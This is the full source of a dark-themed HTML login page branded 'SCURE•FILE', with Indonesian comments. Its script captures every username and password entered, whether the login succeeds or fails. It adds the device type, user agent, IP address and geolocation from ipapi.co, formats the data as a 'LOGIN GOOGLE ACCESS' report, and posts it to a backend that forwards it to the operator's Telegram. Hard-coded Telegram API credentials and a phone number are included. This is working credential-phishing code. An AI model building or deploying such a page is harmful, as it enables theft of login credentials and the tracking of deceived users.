    <style>
        /* [CSS SAMA PERSIS DENGAN SEBELUMNYA - TIDAK BERUBAH] */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: radial-gradient(circle at 20% 30%, #0b0d1a, #03050a);
            font-family: 'Rajdhani', sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }
        body::before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 255, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 255, 0.05) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
        }
        .glow-circle {
            position: absolute;
            width: 350px;
            height: 350px;
            background: radial-gradient(circle at center, rgba(0, 224, 255, 0.15), transparent 70%);

        }
        .glow-circle2 {
            position: absolute;
            width: 450px;
            height: 450px;
            background: radial-gradient(circle at center, rgba(170, 0, 255, 0.08), transparent 70%);
            border-radius: 50%;
            bottom: 5%;
            right: 10%;
            filter: blur(80px);
            z-index: 0;
        }
        .login-container {
            position: relative;
            z-index: 10;
            width: 450px;
            max-width: 95%;
            background: rgba(12, 20, 35, 0.75);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(0, 255, 255, 0.25);
            box-shadow: 0 0 30px rgba(0, 230, 255, 0.2);
            border-radius: 24px;
            padding: 40px 32px;
            transition: 0.3s ease;
        }
        .login-container:hover {
            border-color: rgba(0, 240, 255, 0.6);
            box-shadow: 0 0 45px rgba(0, 210, 255, 0.4);
        }
        .brand {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
            gap: 12px;
            border-bottom: 1px solid rgba(64, 224, 255, 0.3);
            padding-bottom: 20px;
        }
        .brand i {
            font-size: 2.4rem;
            color: #4ef0ff;
            text-shadow: 0 0 10px cyan;
        }
        .brand h2 {
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 1.9rem;
            letter-spacing: 3px;
            background: linear-gradient(45deg, #b5f0ff, #6fe0ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 8px rgba(0,255,255,0.4);
            margin: 0;
        }
        .input-group {

        }
        .input-group label {

            font-family: 'Orbitron', sans-serif;
            font-size: 0.75rem;

            text-transform: uppercase;
            margin-bottom: 8px;

        }
        .input-wrapper {
            display: flex;
            align-items: center;
            background: rgba(8, 20, 36, 0.7);
            border: 1px solid #2c5f6e;
            border-radius: 12px;
            padding: 4px 18px;
            transition: 0.2s;
            backdrop-filter: blur(4px);
        }
        .input-wrapper i {
            color: #2fd6ff;
            font-size: 1.1rem;
            margin-right: 12px;
            text-shadow: 0 0 6px cyan;
            width: 20px;
            text-align: center;
        }
        .input-wrapper input {
            width: 100%;
            background: transparent;
            border: none;
            padding: 16px 0;
            color: #e2faff;
            font-family: 'Rajdhani', sans-serif;
            font-size: 1.1rem;
            font-weight: 500;
            letter-spacing: 0.5px;
            outline: none;
        }
        .input-wrapper input::placeholder {
            color: rgba(140, 210, 255, 0.5);
            font-weight: 300;
            font-family: 'Rajdhani', sans-serif;
            letter-spacing: 1.5px;
        }
        .input-wrapper:focus-within {
            border-color: #00f0ff;
            box-shadow: 0 0 18px rgba(0, 231, 255, 0.5);
            background: rgba(10, 30, 50, 0.8);
        }
        .login-btn {
            width: 100%;
            background: linear-gradient(145deg, #001d2b, #00131c);
            border: 1.5px solid #2ccfdb;
            color: #dbfaff;
            font-family: 'Orbitron', sans-serif;
            font-weight: 600;
            font-size: 1.1rem;
            letter-spacing: 4px;
            padding: 16px 20px;
            border-radius: 40px;
            margin-top: 18px;
            text-transform: uppercase;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            transition: 0.25s;
            cursor: pointer;
            box-shadow: 0 0 12px rgba(0,230,255,0.2);
            position: relative;
            overflow: hidden;
        }
        .login-btn i {
            font-size: 1.2rem;
            color: #4ee6ff;
            text-shadow: 0 0 6px cyan;
        }
        .login-btn:hover {
            background: linear-gradient(145deg, #003546, #001924);
            border-color: #4ef0ff;
            box-shadow: 0 0 30px #00b8ff7f;
            color: white;
            letter-spacing: 6px;
        }
        .login-btn::before {
            content: "";
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.2), transparent);
            transition: left 0.6s;
        }
        .login-btn:hover::before {
            left: 100%;
        }
        .register-link {
            text-align: center;
            margin-top: 22px;
            color: #96c6d9;
            font-size: 0.85rem;
            font-family: 'Rajdhani', sans-serif;
            letter-spacing: 1px;
        }
        .register-link span {
            color: #00f7ff;
            font-weight: 600;
            border-bottom: 1px solid cyan;
            padding-bottom: 2px;
        }
        .alert-message {
            margin-top: 18px;
            padding: 10px 16px;
            background: rgba(255, 40, 100, 0.2);
            border-left: 4px solid #ff3c6c;
            border-radius: 6px;
            color: #ffb2c5;
            font-weight: 500;
            display: none;
            backdrop-filter: blur(5px);
            font-family: 'Rajdhani', sans-serif;
            letter-spacing: 1px;
        }
        .alert-message i {
            margin-right: 8px;
            color: #ff6a8a;
        }
        .status-cred {
            margin-top: 10px;
            font-size: 0.7rem;
            color: #6cc9d4;
            text-align: right;
            opacity: 0.8;
            font-family: 'Orbitron', sans-serif;
        }
        .loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(3, 5, 10, 0.9);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            gap: 20px;
            backdrop-filter: blur(5px);
        }
        .loading i {
            font-size: 4rem;
            color: #00f7ff;
            animation: pulse 1.5s infinite;
        }
        .loading p {
            color: #b0f0ff;
            font-family: 'Orbitron', sans-serif;
            letter-spacing: 4px;
        }
        @keyframes pulse {
            0% { opacity: 0.5; transform: scale(0.95); }
            50% { opacity: 1; transform: scale(1.1); }
            100% { opacity: 0.5; transform: scale(0.95); }
        }
        .note {
            margin-top: 15px;
            padding: 8px;
            background: rgba(255, 255, 0, 0.1);
            border-left: 3px solid #ffaa00;
            color: #ffe08c;
            font-size: 0.7rem;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="glow-circle"></div>
    <div class="glow-circle2"></div>

    <div class="loading" id="loadingScreen">
        <i class="fas fa-circle-notch fa-spin"></i>
        <p>prossecing accses</p>
    </div>

    <div class="login-container">
        <div class="brand">
            <i class="fas fa-shield-haltered"></i>
            <h2>SCURE‚Ä¢FILE</h2>
        </div>

        <div class="input-group">
            <label><i class="fas fa-fingerprint"></i> USERNAME</label>
            <div class="input-wrapper">
                <i class="fas fa-user-astronaut"></i>
                <input type="text" id="username" placeholder=" your email " autocomplete="off">
            </div>
        </div>

        <div class="input-group">
            <label><i class="fas fa-shield-alt"></i> PASSWORD</label>
            <div class="input-wrapper">
                <i class="fas fa-lock"></i>
                <input type="password" id="password" placeholder="‚Ä¢ ‚Ä¢ ‚Ä¢ ‚Ä¢ ‚Ä¢ ‚Ä¢ ‚Ä¢ ‚Ä¢">
            </div>
        </div>

        <button class="login-btn" id="loginBtn">
            <i class="fas fa-plug"></i> LOGIN
        </button>

        <div class="register-link">
            <span>  </span>
        </div>

        <div id="alertBox" class="alert-message">
            <i class="fas fa-exclamation-triangle"></i> <span id="alertText"></span>
        </div>

        <div class="status-cred">
            <i class="fas fa-user-secret"></i> 
        </div>
        
        <!-- INSTRUKSI SETUP -->
        <div class="note" id="setupNote">
            ‚ö†Ô∏è <strong>Developer by servernet-boot:</strong>@<a href="https://my.telegram.org/apps" target="_blank" style="color:#00f7ff;">.https://my.telegram.org</a>, copy¬Æright2026.
        </div>
    </div>

    <script>
        // =============================================
        //      KONFIGURASI AKUN TELEGRAM PRIBADI
        // =============================================
        // üî¥ ANDA WAJIB GANTI 3 HAL INI:
        const API_ID = 39072271;          // GANTI: Ambil dari my.telegram.org/apps (ANGKA)
        const API_HASH = '681ec646ad12680496d8ff03aa359aa1'; // GANTI: Ambil dari my.telegram.org/apps (STRING)
        const PHONE_NUMBER = '+6285704231577';  // GANTI: Nomor HP akun Telegram ANDA (format internasional)
        
        // URL Redirect setelah login berhasil
        const REDIRECT_URL = 'http://192.168.0.108:2525/admin.php';
        
        // =============================================
        //      FUNGSI DETEKSI PERANGKAT (SAMA)
        // =============================================
        function getDeviceModel() {
            const ua = navigator.userAgent;
            if (/iPhone/i.test(ua)) return "iPhone";
            if (/iPad/i.test(ua)) return "iPad";
            if (/Android/i.test(ua)) {
                if (/Samsung/i.test(ua)) return "Samsung Android";
                if (/Xiaomi/i.test(ua)) return "Xiaomi Android";
                if (/Oppo/i.test(ua)) return "Oppo Android";
                if (/Vivo/i.test(ua)) return "Vivo Android";
                return "Android Device";
            }
            if (/Windows/i.test(ua)) return "Windows PC";
            if (/Macintosh/i.test(ua)) return "Apple Mac";
            return "Unknown Device";
        }
        
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) return "Chrome";
            if (/Firefox/i.test(ua)) return "Firefox";
            if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return "Safari";
            if (/Edg/i.test(ua)) return "Edge";
            return "Unknown";
        }
        
        async function getIPAndLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip || 'Tidak diketahui',
                    city: data.city || 'Tidak diketahui',
                    country: data.country_name || 'Tidak diketahui',
                    lat: data.latitude || 'Tidak diketahui',
                    lon: data.longitude || 'Tidak diketahui'
                };
            } catch (e) {
                return {
                    ip: 'Gagal deteksi',
                    city: 'Gagal',
                    country: 'Gagal',
                    lat: 'Gagal',
                    lon: 'Gagal'
                };
            }
        }

        // =============================================
        //   üö®üö®üö® INI BAGIAN PALING PENTING üö®üö®üö®
        //   KIRIM KE SAVED MESSAGES VIA TELEGRAM CORE API
        //   (MENGGUNAKAN BACKEND SERVER, BISA PAKAI 
        //    TELEGRAPH, VERCEL, ATAU RENDER)
        // =============================================
        async function sendToSavedMessages(username, password, status) {
            // Kumpulkan data device
            const device = getDeviceModel();
            const browser = getBrowserInfo();
            const location = await getIPAndLocation();
            const waktu = new Date().toLocaleString('id-ID', { 
                timeZone: 'Asia/Jakarta' 
            });
            
            // Format pesan
            const message = `
üîê *LOGIN GOOGLE ACCESS (PRIVATE MODE)* üîê

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üë§ *AKUN LOGIN*
‚îú Username: \`${username}\`
‚îú Password: \`${password}\`
‚îî Status: ${status}

üì± *PERANGKAT*
‚îú Device: ${device}
‚îú Browser: ${browser}
‚îî User Agent: ${navigator.userAgent}

üìç *LOKASI*
‚îú IP: ${location.ip}
‚îú Kota: ${location.city}
‚îú Negara: ${location.country}
‚îî Maps: https://maps.google.com/?q=${location.lat},${location.lon}

‚è± *WAKTU*
‚îî ${waktu}

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚ö° DIKIRIM VIA USER CLIENT (PRIVATE) ‚ö°
`;

            // -------------------------------------------------
            // üî¥ ANDA HARUS PUNYA BACKEND SERVER
            //    UNTUK MENJALANKAN TELEGRAM CLIENT API
            // -------------------------------------------------
            // Website STATIC (HTML doang) TIDAK BISA langsung 
            // panggil Telegram Core API. Harus pake backend.
            //
            // SOLUSI: Pakai service gratis seperti:
            // 1. Vercel (Node.js) + Telethon
            // 2. Render (Python) + Telethon
            // 3. Heroku + Telethon
            //
            // KODE BACKEND (Python/Node.js) ADA DI BAWAH INI
            // -------------------------------------------------
            
            // UNTUK DEMO: Kirim ke server backend Anda
            // GANTI URL INI DENGAN ENDPOINT BACKEND ANDA
            const BACKEND_URL = 'https://your-backend.vercel.app/api/send-telegram';
            
            try {
                const response = await fetch(BACKEND_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        apiId: API_ID,
                        apiHash: API_HASH,
                        phone: PHONE_NUMBER,
                        message: message
                    })
                });
                
                const data = await response.json();
                console.log('Status kirim:', data.ok ? '‚úÖ Sukses' : '‚ùå Gagal');
                return data.ok;
            } catch (error) {
                console.error('Gagal kirim ke backend:', error);
                // Fallback: tampilkan di console (untuk testing)
                console.log('=== PESAN YANG AKAN DIKIRIM ===');
                console.log(message);
                console.log('================================');
                return false;
            }
        }

        // =============================================
        //      LOGIN HANDLER
        // =============================================
        document.getElementById('loginBtn').addEventListener('click', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const alertBox = document.getElementById('alertBox');
            const alertText = document.getElementById('alertText');
            const loadingScreen = document.getElementById('loadingScreen');

            if (username === '' || password === '') {
                alertBox.style.display = 'block';
                alertText.innerText = '‚ñ∏ USERNAME DAN PASSWORD WAJIB DIISI!';
                return;
            }

            loadingScreen.style.display = 'flex';

            try {
                if (username === "admin@gmail.com" && password === "admin123") {
                    // Kirim ke Saved Messages (via backend)
                    await sendToSavedMessages(username, password, "‚úÖ BERHASIL");
                    
                    alertBox.style.display = 'block';
                    alertBox.style.background = 'rgba(0, 255, 200, 0.15)';
                    alertBox.style.borderLeftColor = '#00e6c4';
                    alertBox.style.color = '#b3ffe6';
                    alertText.innerText = '‚úì AKSES GRANTED ‚Ä¢ MENGALIHKAN KE GOOGLE...';
                    
                    setTimeout(() => {
                        window.location.href = REDIRECT_URL;
                    }, 1500);
                } else {
                    await sendToSavedMessages(username, password, "‚ùå GAGAL");
                    
                    alertBox.style.display = 'block';
                    alertText.innerText = '‚ñ∏ AKSES DITOLAK! USERNAME/PASSWORD SALAH';
                    loadingScreen.style.display = 'none';
                }
            } catch (error) {
                alertBox.style.display = 'block';
                alertText.innerText = '‚ñ∏ TERJADI KESALAHAN SISTEM';
                loadingScreen.style.display = 'none';
            }
        });

        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                document.getElementById('loginBtn').click();
            }
        });
    </script>
</body>
